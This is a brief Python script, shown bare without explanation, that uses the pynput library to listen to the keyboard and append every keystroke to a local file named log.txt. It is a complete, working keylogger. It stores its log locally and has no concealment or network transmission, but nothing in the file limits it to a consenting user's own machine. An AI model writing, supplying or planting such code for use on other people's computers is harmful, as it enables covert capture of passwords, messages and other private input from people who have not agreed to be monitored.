from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(f'{key.char}')
        except AttributeError:
            f.write(f'[{key}]')

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
